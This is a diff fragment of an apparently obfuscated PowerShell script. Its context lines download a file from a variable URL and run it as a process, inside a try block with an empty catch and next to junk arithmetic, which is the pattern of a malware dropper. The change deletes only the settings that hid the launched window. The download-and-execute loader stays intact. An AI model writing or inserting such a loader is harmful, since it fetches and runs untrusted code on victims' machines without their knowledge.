@@ -118,8 +118,6 @@ try{
     $v35.DownloadFile($v30,$v33)
     $v36=New-Object System.Diagnostics.ProcessStartInfo
     $v36.FileName=$v33
-    $v36.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
-    $v36.CreateNoWindow=$true
     [System.Diagnostics.Process]::Start($v36)|Out-Null
 }catch{}
 $v37=7*2+1
